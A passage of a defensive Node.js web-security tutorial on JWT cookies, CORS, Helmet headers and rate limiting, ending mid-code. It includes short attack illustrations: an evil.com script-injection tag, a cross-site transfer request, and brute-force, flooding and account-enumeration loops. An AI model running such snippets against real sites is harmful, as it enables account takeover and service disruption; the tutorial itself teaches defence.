**Option 3: SessionStorage (❌ Still vulnerable)**:

```js
sessionStorage.setItem("token", jwt);
// Same XSS vulnerability as localStorage
```

**✅ Option 4: HTTP-Only Cookie**:

```js
res.cookie("token", jwt, {
  httpOnly: true,      // JavaScript CANNOT access this cookie
  secure: true,        // Only send over HTTPS
  sameSite: "strict",  // Only send to same site (CSRF protection)
  maxAge: 15 * 60 * 1000, // 15 minutes
  domain: ".myapp.com", // Optional: share across subdomains
  path: "/",           // Cookie sent to all paths
  partitioned: true    // New standard for cross-site cookies
});
```

**What HTTP-only cookie gives you**:

```
Browser
┌─────────────────────────────────────────────────────────┐
│                                                         │
│  <script>                                               │
│    console.log(document.cookie);                        │
│    // Output: "" (empty string)                         │
│                                                         │
│    console.log(localStorage.getItem("token"));          │
│    // Output: null                                      │
│  </script>                                              │
│                                                         │
│  Request to myapp.com:                                  │
│  Cookie: token=eyJhbGciOiJIUzI1NiIs...                  │
│  ✓ Automatically included by browser                    │
│  ✗ Cannot be read by JavaScript                         │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

**CSRF Protection with sameSite**:

| sameSite value | Behavior |
|----------------|----------|
| `"strict"` | Cookie only sent for same-site requests (best security) |
| `"lax"` | Cookie sent for top-level navigation (balance) |
| `"none"` | Cookie sent for all requests (requires `secure: true`) |

### 6.5. Complete JWT Implementation

```js
const jwt = require("jsonwebtoken");
const crypto = require("crypto");

// ========== CONFIGURATION ==========
const JWT_CONFIG = {
  accessToken: {
    secret: process.env.JWT_SECRET,
    expiresIn: "15m",      // Short-lived
    algorithm: "HS256",
    issuer: process.env.APP_URL,
    audience: process.env.API_URL
  },
  refreshToken: {
    secret: process.env.JWT_REFRESH_SECRET,
    expiresIn: "7d",       // Long-lived
    algorithm: "HS256",
    issuer: process.env.APP_URL,
    audience: process.env.API_URL
  }
};

// ========== TOKEN GENERATION ==========
function generateAccessToken(user) {
  // Minimize payload - only what's absolutely necessary
  const payload = {
    sub: user._id.toString(),      // Subject (user ID)
    role: user.role,              // Authorization
    perms: user.permissions || [], // Specific permissions
    jti: crypto.randomBytes(16).toString("hex"), // Unique token ID
    iss: JWT_CONFIG.accessToken.issuer,
    aud: JWT_CONFIG.accessToken.audience
  };

  return jwt.sign(payload, JWT_CONFIG.accessToken.secret, {
    expiresIn: JWT_CONFIG.accessToken.expiresIn,
    algorithm: JWT_CONFIG.accessToken.algorithm
  });
}

function generateRefreshToken(user) {
  const payload = {
    sub: user._id.toString(),
    jti: crypto.randomBytes(16).toString("hex"),
    type: "refresh",
    iss: JWT_CONFIG.refreshToken.issuer,
    aud: JWT_CONFIG.refreshToken.audience
  };

  return jwt.sign(payload, JWT_CONFIG.refreshToken.secret, {
    expiresIn: JWT_CONFIG.refreshToken.expiresIn,
    algorithm: JWT_CONFIG.refreshToken.algorithm
  });
}

// ========== COOKIE SETTINGS ==========
function setTokenCookies(res, accessToken, refreshToken) {
  // Access token - short lived
  res.cookie("token", accessToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "strict",
    maxAge: 15 * 60 * 1000, // 15 minutes
    path: "/",
    partitioned: true
  });

  // Refresh token - longer lived
  res.cookie("refreshToken", refreshToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "strict",
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
    path: "/",
    partitioned: true
  });
}

// ========== CLEAR TOKENS (LOGOUT) ==========
function clearTokenCookies(res) {
  res.clearCookie("token", {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "strict",
    path: "/"
  });
  
  res.clearCookie("refreshToken", {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "strict",
    path: "/"
  });
}

// ========== AUTH MIDDLEWARE ==========
async function authenticate(req, res, next) {
  try {
    // 1. Get token from cookie
    const token = req.cookies.token;
    
    if (!token) {
      return res.status(401).json({
        error: "Authentication required",
        code: "NO_TOKEN"
      });
    }

    // 2. Verify token
    const decoded = jwt.verify(token, JWT_CONFIG.accessToken.secret, {
      issuer: JWT_CONFIG.accessToken.issuer,
      audience: JWT_CONFIG.accessToken.audience,
      algorithms: [JWT_CONFIG.accessToken.algorithm]
    });

    // 3. Check if token is blacklisted (if you maintain one)
    const isBlacklisted = await TokenBlacklist.exists({ jti: decoded.jti });
    if (isBlacklisted) {
      return res.status(401).json({
        error: "Token has been revoked",
        code: "TOKEN_REVOKED"
      });
    }

    // 4. Get user from database (optional, but recommended)
    const user = await User.findById(decoded.sub)
      .select("-passwordHash -__v");
    
    if (!user) {
      return res.status(401).json({
        error: "User no longer exists",
        code: "USER_NOT_FOUND"
      });
    }

    // 5. Check if password was changed after token issued
    if (user.passwordChangedAt) {
      const tokenIssuedAt = decoded.iat * 1000; // Convert to milliseconds
      const passwordChangedAt = new Date(user.passwordChangedAt).getTime();
      
      if (passwordChangedAt > tokenIssuedAt) {
        return res.status(401).json({
          error: "Token invalid - password changed",
          code: "PASSWORD_CHANGED"
        });
      }
    }

    // 6. Attach user to request
    req.user = {
      id: user._id,
      role: user.role,
      permissions: decoded.perms || [],
      tokenId: decoded.jti
    };

    next();
  } catch (error) {
    // Handle specific JWT errors
    if (error.name === "TokenExpiredError") {
      return res.status(401).json({
        error: "Token expired",
        code: "TOKEN_EXPIRED"
      });
    }
    
    if (error.name === "JsonWebTokenError") {
      return res.status(401).json({
        error: "Invalid token",
        code: "INVALID_TOKEN"
      });
    }

    // Generic error
    res.status(401).json({
      error: "Authentication failed",
      code: "AUTH_FAILED"
    });
  }
}

// ========== REFRESH TOKEN ENDPOINT ==========
async function refreshToken(req, res) {
  try {
    const refreshToken = req.cookies.refreshToken;
    
    if (!refreshToken) {
      return res.status(401).json({
        error: "Refresh token required",
        code: "NO_REFRESH_TOKEN"
      });
    }

    // 1. Verify refresh token
    const decoded = jwt.verify(
      refreshToken,
      JWT_CONFIG.refreshToken.secret,
      {
        issuer: JWT_CONFIG.refreshToken.issuer,
        audience: JWT_CONFIG.refreshToken.audience,
        algorithms: [JWT_CONFIG.refreshToken.algorithm]
      }
    );

    // 2. Check if refresh token is blacklisted
    const isBlacklisted = await TokenBlacklist.exists({ jti: decoded.jti });
    if (isBlacklisted) {
      clearTokenCookies(res);
      return res.status(401).json({
        error: "Refresh token revoked",
        code: "REFRESH_REVOKED"
      });
    }

    // 3. Find user
    const user = await User.findById(decoded.sub);
    if (!user) {
      clearTokenCookies(res);
      return res.status(401).json({
        error: "User not found",
        code: "USER_NOT_FOUND"
      });
    }

    // 4. Blacklist the used refresh token (prevent reuse)
    await TokenBlacklist.create({
      jti: decoded.jti,
      expiresAt: new Date(decoded.exp * 1000)
    });

    // 5. Generate new tokens
    const newAccessToken = generateAccessToken(user);
    const newRefreshToken = generateRefreshToken(user);
    
    // 6. Set new cookies
    setTokenCookies(res, newAccessToken, newRefreshToken);

    res.json({
      success: true,
      message: "Token refreshed"
    });

  } catch (error) {
    clearTokenCookies(res);
    
    if (error.name === "TokenExpiredError") {
      return res.status(401).json({
        error: "Refresh token expired - login required",
        code: "REFRESH_EXPIRED"
      });
    }

    res.status(401).json({
      error: "Invalid refresh token",
      code: "INVALID_REFRESH"
    });
  }
}

// ========== LOGOUT ==========
async function logout(req, res) {
  try {
    // Blacklist both tokens if present
    const accessToken = req.cookies.token;
    const refreshToken = req.cookies.refreshToken;
    
    if (accessToken) {
      const decoded = jwt.decode(accessToken);
      if (decoded && decoded.jti) {
        await TokenBlacklist.create({
          jti: decoded.jti,
          expiresAt: new Date(decoded.exp * 1000)
        });
      }
    }
    
    if (refreshToken) {
      const decoded = jwt.decode(refreshToken);
      if (decoded && decoded.jti) {
        await TokenBlacklist.create({
          jti: decoded.jti,
          expiresAt: new Date(decoded.exp * 1000)
        });
      }
    }

    // Clear cookies
    clearTokenCookies(res);
    
    res.json({
      success: true,
      message: "Logged out successfully"
    });
  } catch (error) {
    console.error("Logout error:", error);
    res.status(500).json({ error: "Logout failed" });
  }
}
```

### 6.6. JWT Security Checklist

- Use short-lived access tokens (5-15 minutes)
- Use refresh tokens for longer sessions (7-30 days)
- Store tokens in HTTP-only cookies
- Set `secure: true` in production
- Set `sameSite: "strict"` for CSRF protection
- Never store sensitive data in payload
- Use strong secrets (32+ random characters)
- Implement token blacklisting for logout
- Rotate refresh tokens (issue new one on each use)
- Check password changes after token issuance
- Include unique `jti` claim for token tracking
- Validate issuer and audience
- Use appropriate algorithms (HS256, RS256)
- Limit token size (avoid large payloads)
- Log all token operations (generation, refresh, revocation)
- Implement rate limiting on refresh endpoint

## 7. CORS (Cross-Origin Resource Sharing)

### 7.1. The Same-Origin Policy: Why It Exists

**The web's fundamental security model**:

```
Your Bank (bank.com)                  Evil Site (evil.com)
┌───────────────────┐                 ┌───────────────────┐
│                   │                 │                   │
│  Your account     │                 │  <script>         │
│  Balance: $10,000 │                 │  fetch('bank.com/ │
│                   │                 │    api/transfer', │
│                   │                 │    {              │
│                   │                 │      amount: 9999 │
│                   │                 │    })             │
│                   │                 │  </script>        │
│                   │                 │                   │
└───────────────────┘                 └───────────────────┘
         ↓                                     ↓
    Logged-in cookie                   No cookie from bank.com
         ↓                                     ↓
    Request succeeds?                  Request blocked by CORS
         ✓                                     ✗
```

**Same-Origin Policy prevents**:
- Evil site reading your email from Gmail
- Evil site transferring money from your bank
- Evil site accessing your company's internal tools
- Evil site stealing your session cookies

### 7.2. When You Need CORS

**Same-origin requests (always allowed)**:
```
https://myapp.com/page.html
    ↓ requests
https://myapp.com/api/data
    ✓ Allowed - same protocol, domain, port
```

**Cross-origin requests (blocked by default)**:
```
https://myapp.com
    ↓ requests
https://api.myapp.com     ✓ Different subdomain
http://myapp.com          ✗ Different protocol
https://myapp.com:8080    ✗ Different port
https://evil.com          ✗ Different domain
```

**When you need to allow cross-origin**:
- Single-page app on `app.myapp.com` talking to `api.myapp.com`
- Mobile app (no origin) talking to your API
- Third-party services needing access
- Public APIs

### 7.3. How CORS Works: The Preflight Request

**Simple requests** (GET, POST with certain content types) don't need preflight:

```
Browser → Server: 
GET /api/users
Origin: https://myapp.com

Server → Browser:
Access-Control-Allow-Origin: https://myapp.com
```

**Complex requests** (PUT, DELETE, custom headers, non-standard content types) need preflight:

```
Step 1: Preflight (OPTIONS)
┌─────────────────────────────────────────────────────────────┐
│ OPTIONS /api/users HTTP/1.1                                 │
│ Origin: https://myapp.com                                   │
│ Access-Control-Request-Method: DELETE                       │
│ Access-Control-Request-Headers: Content-Type, X-Custom      │
└─────────────────────────────────────────────────────────────┘
                              ↓
Step 2: Preflight response
┌─────────────────────────────────────────────────────────────┐
│ HTTP/1.1 204 No Content                                     │
│ Access-Control-Allow-Origin: https://myapp.com              │
│ Access-Control-Allow-Methods: GET, POST, PUT, DELETE        │
│ Access-Control-Allow-Headers: Content-Type, X-Custom        │
│ Access-Control-Allow-Credentials: true                      │
│ Access-Control-Max-Age: 86400                               │
└─────────────────────────────────────────────────────────────┘
                              ↓
Step 3: Actual request
┌─────────────────────────────────────────────────────────────┐
│ DELETE /api/users/123 HTTP/1.1                              │
│ Origin: https://myapp.com                                   │
│ Content-Type: application/json                              │
│ X-Custom: value                                             │
└─────────────────────────────────────────────────────────────┘
```

### 7.4. CORS Headers Explained

**Access-Control-Allow-Origin**:
```js
// Allow specific origin
"Access-Control-Allow-Origin: https://myapp.com"

// Allow any origin (public API, no credentials)
"Access-Control-Allow-Origin: *"

// Cannot use * with credentials
```

**Access-Control-Allow-Credentials**:
```js
"Access-Control-Allow-Credentials: true"

// Allows cookies, authorization headers to be sent
// When true, Allow-Origin cannot be *
```

**Access-Control-Allow-Methods**:
```js
"Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH"
```

**Access-Control-Allow-Headers**:
```js
"Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With"
```

**Access-Control-Expose-Headers**:
```js
"Access-Control-Expose-Headers: X-Total-Count, X-RateLimit-Limit"
// Headers JavaScript can access in response
```

**Access-Control-Max-Age**:
```js
"Access-Control-Max-Age: 86400" // Cache preflight for 24 hours
```

### 7.5. CORS Configuration Patterns

**1. Development: Allow all**:
```js
const cors = require("cors");

app.use(cors()); // Access-Control-Allow-Origin: *
                // Access-Control-Allow-Methods: *
                // Access-Control-Allow-Headers: *
```

**2. Production: Specific origins**:
```js
const corsOptions = {
  origin: function(origin, callback) {
    const allowedOrigins = [
      "https://myapp.com",
      "https://www.myapp.com",
      "https://admin.myapp.com",
      "https://api.myapp.com"  // For service-to-service
    ];
    
    // Allow requests with no origin (mobile apps, curl, Postman)
    if (!origin) {
      return callback(null, true);
    }
    
    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error(`${origin} is not allowed by CORS`));
    }
  },
  methods: ["GET", "POST", "PUT", "PATCH", "DELETE"],
  allowedHeaders: ["Content-Type", "Authorization", "X-Requested-With"],
  exposedHeaders: ["X-Total-Count", "X-RateLimit-Limit", "X-RateLimit-Remaining"],
  credentials: true,
  maxAge: 86400, // 24 hours
  preflightContinue: false,
  optionsSuccessStatus: 204
};

app.use(cors(corsOptions));
```

**3. Environment-based configuration**:
```js
const corsOptions = {
  origin: process.env.NODE_ENV === "production"
    ? ["https://myapp.com", "https://www.myapp.com"]
    : ["http://localhost:3000", "http://localhost:5173", "http://localhost:4200"],
  
  credentials: true,
  maxAge: process.env.NODE_ENV === "production" ? 86400 : 0
};

app.use(cors(corsOptions));
```

**4. Dynamic origin checking**:
```js
const corsOptions = {
  origin: async (origin, callback) => {
    // Fetch allowed origins from database/cache
    const allowedOrigins = await getAllowedOrigins();
    
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error("CORS policy violation"));
    }
  },
  credentials: true
};
```

**5. Route-specific CORS**:
```js
// Public API - allow anyone
app.get("/api/public", cors(), (req, res) => {
  res.json({ data: "public" });
});

// Authenticated API - restrict origins
app.post("/api/users", cors(corsOptions), authenticate, (req, res) => {
  res.json({ data: "private" });
});

// No CORS needed for same-origin routes
app.get("/internal/health", (req, res) => {
  res.json({ status: "ok" });
});
```

### 7.6. Common CORS Errors and Solutions

**Error 1: No 'Access-Control-Allow-Origin' header**:
```
Access to fetch at 'https://api.myapp.com' from origin 'https://myapp.com' 
has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header 
is present on the requested resource.
```

✅ **Fix**: Add CORS middleware:
```js
app.use(cors({ origin: "https://myapp.com" }));
```

**Error 2: Credentials not allowed with wildcard**:
```
Access to fetch at 'https://api.myapp.com' from origin 'https://myapp.com' 
has been blocked by CORS policy: The value of the 'Access-Control-Allow-Origin' 
header in the response must not be the wildcard '*' when the request's 
credentials mode is 'include'.
```

✅ **Fix**: Specify exact origin:
```js
app.use(cors({
  origin: "https://myapp.com",  // Cannot be '*'
  credentials: true
}));
```

**Error 3: Method not allowed**:
```
Access to fetch at 'https://api.myapp.com' from origin 'https://myapp.com' 
has been blocked by CORS policy: Method DELETE is not allowed by 
Access-Control-Allow-Methods in preflight response.
```

✅ **Fix**: Add method to allowed list:
```js
app.use(cors({
  origin: "https://myapp.com",
  methods: ["GET", "POST", "PUT", "DELETE", "PATCH"] // Include DELETE
}));
```

**Error 4: Header not allowed**:
```
Request header field x-custom-header is not allowed by 
Access-Control-Allow-Headers in preflight response.
```

✅ **Fix**: Add header to allowed list:
```js
app.use(cors({
  origin: "https://myapp.com",
  allowedHeaders: ["Content-Type", "Authorization", "X-Custom-Header"]
}));
```

**Error 5: Preflight request failing**:
```
Access to fetch at 'https://api.myapp.com' from origin 'https://myapp.com' 
has been blocked by CORS policy: Response to preflight request doesn't pass 
access control check: It does not have HTTP ok status.
```

✅ **Fix**: Ensure OPTIONS requests are handled:
```js
// cors middleware handles OPTIONS automatically
app.use(cors(corsOptions));

// Or manually handle OPTIONS
app.options("/api/users", cors(corsOptions));
```

### 7.7. CORS Security Best Practices

**1. Never use wildcard with credentials**:
```js
// ❌ WRONG - credentials cannot be sent
app.use(cors({ origin: "*", credentials: true }));

// ✅ CORRECT - specify exact origins
app.use(cors({ 
  origin: ["https://myapp.com", "https://api.myapp.com"],
  credentials: true 
}));
```

**2. Validate origins dynamically**:
```js
app.use(cors({
  origin: (origin, callback) => {
    // Block requests from unexpected origins
    if (!origin || isValidOrigin(origin)) {
      callback(null, origin);
    } else {
      callback(new Error("CORS policy violation"));
    }
  }
}));
```

**3. Limit allowed methods**:
```js
// ❌ WRONG - allows all HTTP methods
app.use(cors({ methods: "*" }));

// ✅ CORRECT - only methods you actually use
app.use(cors({ 
  methods: ["GET", "POST", "PUT", "DELETE"] 
}));
```

**4. Set reasonable preflight cache**:
```js
// Cache preflight for 24 hours (reduces OPTIONS requests)
app.use(cors({ maxAge: 86400 }));
```

**5. Log CORS violations**:
```js
app.use(cors({
  origin: (origin, callback) => {
    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      console.warn(`CORS violation from origin: ${origin}`);
      callback(new Error("Not allowed by CORS"));
    }
  }
}));
```

## 8. Security Headers with Helmet.js

### 8.1. Why Security Headers Matter

**HTTP headers are instructions to the browser**:

```
Without security headers:
Browser: "No instructions. I'll allow iframes, guess content types,
          and accept any protocol. This page could be embedded
          on evil.com, I wouldn't know."

With security headers:
Browser: "Server says: Don't embed me in iframes, don't guess
          content types, only use HTTPS, and here's exactly
          where scripts can load from. I'll enforce these rules."
```

### 8.2.Each Security Header Explained

**X-Frame-Options: Prevent Clickjacking**:
```http
X-Frame-Options: DENY
```

Clickjacking attack:
```
Attacker's page:
┌─────────────────────────────────────┐
│  Claim your free iPhone!            │
│  ┌─────────────────────────────┐    │
│  │                             │    │
│  │  Your bank (in iframe)      │    │
│  │  Transfer $1000? [OK]       │    │
│  │                             │    │
│  └─────────────────────────────┘    │
│  [Click here to claim prize]        │
└─────────────────────────────────────┘
        ↓
User thinks they're clicking "Claim prize"
Actually clicking "OK" on bank transfer
```

**X-Content-Type-Options: Prevent MIME Sniffing**:
```http
X-Content-Type-Options: nosniff
```

MIME sniffing attack:
```
1. Attacker uploads: "profile.jpg"
   Content-Type: image/jpeg
   Actual content: <script>stealCookies()</script>

2. Browser: "Content-Type says JPEG, but this looks like JavaScript!"
   Without header: "I'll execute it as JavaScript"
   With header:    "Content-Type says JPEG, treat as image"
```

**Strict-Transport-Security (HSTS): Force HTTPS**:
```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

What HSTS does:
```
First visit:    http://myapp.com
                ↓
HSTS header:    "For the next year, only use HTTPS"
                ↓
Next visit:     Browser automatically upgrades http:// → https://
                ↓
If certificate invalid: Browser BLOCKS connection, no warning bypass
```

**Content-Security-Policy (CSP): Prevent XSS**:
```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

Without CSP:
```html
<!-- Attacker injects this -->
<script src="https://evil.com/hack.js"></script>
<!-- Executes! -->
```

With CSP:
```html
<!-- Attacker injects this -->
<script src="https://evil.com/hack.js"></script>
<!-- Blocked! CSP error in console -->
```

**X-XSS-Protection: Legacy XSS Filter**:
```http
X-XSS-Protection: 1; mode=block
```

Legacy browsers will block reflected XSS attempts.

**Referrer-Policy: Control referrer information**:
```http
Referrer-Policy: strict-origin-when-cross-origin
```

Controls what URL information is sent in the `Referer` header.

**Permissions-Policy: Disable browser features**:
```http
Permissions-Policy: geolocation=(), camera=(), microphone=()
```

Disables sensitive features your app doesn't need.

### 8.3. Helmet.js Implementation

**Basic setup (recommended)**:
```js
const express = require("express");
const helmet = require("helmet");

const app = express();

// Sets all secure defaults
app.use(helmet());

// Your other middleware
app.use(express.json());
```

**What helmet() sets**:
```js
helmet() = {
  contentSecurityPolicy: { ... },     // CSP policy
  crossOriginEmbedderPolicy: true,    // COEP
  crossOriginOpenerPolicy: true,      // COOP
  crossOriginResourcePolicy: true,    // CORP
  dnsPrefetchControl: true,           // X-DNS-Prefetch-Control: off
  expectCt: true,                    // Expect-CT
  frameguard: true,                  // X-Frame-Options: SAMEORIGIN
  hidePoweredBy: true,               // Remove X-Powered-By
  hsts: true,                       // Strict-Transport-Security
  ieNoOpen: true,                  // X-Download-Options: noopen
  noSniff: true,                  // X-Content-Type-Options: nosniff
  originAgentCluster: true,      // Origin-Agent-Cluster
  permittedCrossDomainPolicies: true, // X-Permitted-Cross-Domain-Policies
  referrerPolicy: true,          // Referrer-Policy
  xssFilter: true               // X-XSS-Protection: 0
}
```

### 8.4. Custom Helmet Configuration

**Production configuration**:
```js
app.use(helmet({
  // Content Security Policy
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        "'self'",
        "'unsafe-inline'", // Only if necessary
        "https://cdnjs.cloudflare.com"
      ],
      styleSrc: [
        "'self'",
        "'unsafe-inline'", // Usually needed for CSS-in-JS
        "https://fonts.googleapis.com"
      ],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: [
        "'self'",
        "https://api.myapp.com",
        "https://sentry.io" // Error tracking
      ],
      frameSrc: ["'none'"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: [],
      baseUri: ["'self'"],
      formAction: ["'self'"],
      manifestSrc: ["'self'"],
      mediaSrc: ["'self'"],
      workerSrc: ["'self'", "blob:"],
      frameAncestors: ["'none'"], // X-Frame-Options replacement
    },
    reportOnly: false, // Set true to test without blocking
    reportUri: "/api/csp-violation" // Collect violation reports
  },

  // HSTS - Force HTTPS
  hsts: {
    maxAge: 31536000, // 1 year in seconds
    includeSubDomains: true,
    preload: true
  },

  // Referrer Policy
  referrerPolicy: {
    policy: "strict-origin-when-cross-origin"
  },

  // Frameguard
  frameguard: {
    action: "deny" // deny, sameorigin, allow-from
  },

  // Cross-Origin policies
  crossOriginEmbedderPolicy: true,
  crossOriginOpenerPolicy: {
    policy: "same-origin"
  },
  crossOriginResourcePolicy: {
    policy: "same-origin"
  },

  // Remove X-Powered-By
  hidePoweredBy: true,

  // Permissions Policy
  permissionsPolicy: {
    features: {
      geolocation: ["none"],
      camera: ["none"],
      microphone: ["none"],
      payment: ["none"],
      usb: ["none"],
      vibrate: ["none"]
    }
  },

  // X-XSS-Protection
  xssFilter: true,

  // X-Content-Type-Options
  noSniff: true,

  // X-DNS-Prefetch-Control
  dnsPrefetchControl: {
    allow: false
  },

  // X-Download-Options
  ieNoOpen: true,

  // X-Permitted-Cross-Domain-Policies
  permittedCrossDomainPolicies: {
    permittedPolicies: "none"
  }
}));
```

### 8.5. CSP Violation Reporting

**Set up CSP in report-only mode**:
```js
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      // ... other directives
    },
    reportOnly: true, // Test without blocking
    reportUri: "/api/csp-violation"
  }
}));

// Collect violation reports
app.post("/api/csp-violation", (req, res) => {
  console.log("CSP Violation:", req.body);
  // Log to file, database, or monitoring service
  res.status(204).end();
});
```

**CSP violation report format**:
```json
{
  "csp-report": {
    "document-uri": "https://myapp.com/dashboard",
    "referrer": "https://myapp.com/login",
    "blocked-uri": "https://evil.com/hack.js",
    "violated-directive": "script-src-elem",
    "effective-directive": "script-src-elem",
    "original-policy": "default-src 'self'; script-src 'self'",
    "disposition": "report",
    "script-sample": "console.log('XSS')",
    "status-code": 200
  }
}
```

### 8.6. Security Headers Testing

**Check your headers**:
```bash
curl -I https://myapp.com
```

**Expected headers**:
```http
HTTP/2 200 OK
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'; script-src 'self'
X-XSS-Protection: 0
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), camera=(), microphone=()
X-DNS-Prefetch-Control: off
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
```

**Testing tools**:
- [Security Headers](https://securityheaders.com) - Grade your headers
- [CSP Evaluator](https://csp-evaluator.withgoogle.com) - Check CSP policy
- [Observatory by Mozilla](https://observatory.mozilla.org) - Comprehensive scan

---

## 9. Rate Limiting

### 9.1. Why Rate Limiting Is Critical

**Without rate limiting, attackers can**:

**1. Brute force passwords**:
```js
// Attacker's script
for (let i = 0; i < 1000000; i++) {
  await fetch("/api/login", {
    method: "POST",
    body: JSON.stringify({
      email: "admin@example.com",
      password: dictionary[i]
    })
  });
}
// 1,000,000 attempts → Password will be cracked
```

**2. Denial of Service (DoS)**:
```js
// 10,000 requests per second
while(true) {
  fetch("/api/search?q=" + randomString(1000));
}
// Server CPU: 100%
// Database: overwhelmed
// Legitimate users: timeout/errors
```

**3. Resource exhaustion**:
```js
// Expensive operations
for (let i = 0; i < 10000; i++) {
  fetch("/api/reports/generate"); // CPU-intensive
  fetch("/api/export/csv");       // Memory-intensive
}
```

**4. Account enumeration**:
```js
// Check which emails are registered
const emails = ["alice@gmail.com", "bob@gmail.com", ...];
for (const email of emails) {
  const res = await fetch("/api/signup", {
    method: "POST",
    body: JSON.stringify({ email })
  });
  // 409 Conflict = email exists
  // 200 OK = email available
}
```

**5. Bypass rate limits with distributed attacks**:
```js
// 1000 IP addresses × 100 requests each = 100,000 attempts
// Traditional per-IP rate limiting won't catch this
```

### 9.2. Rate Limiting Strategies

**1. Per-IP limiting (basic)**:
```js
const rateLimit = require("express-rate-limit");

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,                 // 100 requests per IP
  message: "Too many requests from this IP"
});

app.use("/api", limiter);
```

**2. Per-user limiting (authenticated)**:
```js
const userLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  keyGenerator: (req) => {
    // Use user ID for authenticated requests, IP for anonymous
    return req.user?.id || req.ip;
  },
  skip: (req) => !req.user // Skip for anonymous users
});

app.use("/api/user", userLimiter);
```

**3. Endpoint-specific limits**:
```js
// Authentication endpoints - very strict
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5,                   // 5 attempts
  skipSuccessfulRequests: true, // Don't count successful logins
  message: "Too many login attempts. Try again in 15 minutes."
});

// API endpoints - standard
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: "Rate limit exceeded"
});

// Search endpoints - moderate
const searchLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 30,            // 30 searches per minute
  message: "Search rate limit exceeded"
});

// Public endpoints - generous
const publicLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 60,
  message: "Rate limit exceeded"
});

app.use("/api/login", authLimiter);
app.use("/api/signup", authLimiter);
app.use("/api", apiLimiter);
app.use("/api/search", searchLimiter);
app.use("/", publicLimiter);
```

**4. Weighted rate limiting**:
```js
const rateLimit = require("express-rate-limit");

const weightedLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: async (req) => {
    // Different limits based on user role
    if (req.user?.role === "admin") return 1000;
    if (req.user?.role === "premium") return 500;
    if (req.user?.role === "user") return 100;
    return 20; // Anonymous
  },
  keyGenerator: (req) => req.user?.id || req.ip
});
```

**5. Distributed rate limiting (Redis)**:
```js
const RedisStore = require("rate-limit-redis");
const Redis = require("ioredis");

const redisClient = new Redis({
  host: "localhost",
  port: 6379,
  password: process.env.REDIS_PASSWORD
});

const limiter = rateLimit({
  store: new RedisStore({
    client: redisClient,
    prefix: "rl:", // Redis key prefix
  }),
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: "Too many requests"
});

app.use("/api", limiter);
```

### 9.3. Advanced Rate Limiting Implementation

**Complete rate limiting solution**:

```js
const rateLimit = require("express-rate-limit");
const RedisStore = require("rate-limit-redis");
const Redis = require("ioredis");
const { createClient } = require("redis");

class RateLimiterService {
  constructor() {
    this.redisClient = process.env.NODE_ENV === "production"
      ? new Redis({
          host: process.env.REDIS_HOST,
          port: process.env.REDIS_PORT,
          password: process.env.REDIS_PASSWORD,
          enableReadyCheck: true,
          lazyConnect: true
        })
      : null;
  }

  // Create custom limiter with options
  createLimiter(options = {}) {
    const defaultOptions = {
      windowMs: 15 * 60 * 1000,
      max: 100,
      message: "Too many requests, please try again later.",
      statusCode: 429,
      standardHeaders: true, // Return rate limit info in headers
      legacyHeaders: false,  // Disable X-RateLimit-* headers
      
      // Skip successful requests for auth endpoints
      skipSuccessfulRequests: false,
      
      // Custom key generator
      keyGenerator: (req) => {
        // Use authenticated user ID if available
        if (req.user?.id) {
          return `user:${req.user.id}`;
        }
        // Use IP + user agent for anonymous
        return `ip:${req.ip}:${req.headers["user-agent"] || ""}`;
      },
      
      // Skip rate limiting for whitelisted IPs
      skip: (req) => {
        const whitelist = ["127.0.0.1", "::1", process.env.SERVER_IP];
        return whitelist.includes(req.ip);
      },
      
      // Custom handler when limit is exceeded
      handler: (req, res, next, options) => {
        // Log rate limit violations
        console.warn(`Rate limit exceeded for ${req.ip} on ${req.path}`);
        
        res.status(options.statusCode).json({
          error: options.message,
          code: "RATE_LIMIT_EXCEEDED",
          retryAfter: Math.ceil(options.windowMs / 1000)
        });
      }
    };

    const limiterOptions = { ...defaultOptions, ...options };

    // Use Redis store in production
    if (this.redisClient && process.env.NODE_ENV === "production") {
      limiterOptions.store = new RedisStore({
        client: this.redisClient,
        prefix: `ratelimit:${options.prefix || "default"}:`,
        sendCommand: (...args) => this.redisClient.call(...args)
      });
    }

    return rateLimit(limiterOptions);
  }

  // Pre-configured limiters
  get limiters() {
    return {
      // Strict: 5 attempts per 15 minutes
      auth: this.createLimiter({
        windowMs: 15 * 60 * 1000,
        max: 5,
        prefix: "auth",
        message: "Too many authentication attempts. Please try again in 15 minutes.",
        skipSuccessfulRequests: true
      }),

      // Standard: 100 requests per 15 minutes
      api: this.createLimiter({
        windowMs: 15 * 60 * 1000,
        max: 100,
        prefix: "api",
